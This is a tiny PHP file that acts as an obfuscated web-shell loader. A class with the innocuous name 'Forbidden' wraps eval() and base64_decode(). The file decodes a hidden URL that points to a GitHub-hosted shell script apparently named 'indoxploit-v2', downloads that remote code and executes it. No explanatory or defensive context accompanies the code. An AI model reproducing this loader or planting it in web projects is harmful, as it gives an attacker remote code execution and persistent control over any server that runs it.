<?php
class Forbidden {
	public function Feval($string) {
		return eval($string);
	}
	public function Fbase($string) {
		return base64_decode($string);
	}
}
$error = New Forbidden;
$error->Feval(file_get_contents($error->Fbase("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hkYXZpYW4vc2hlbGwvbWFpbi9pbmRveHBsb2l0LXYy")));

?>
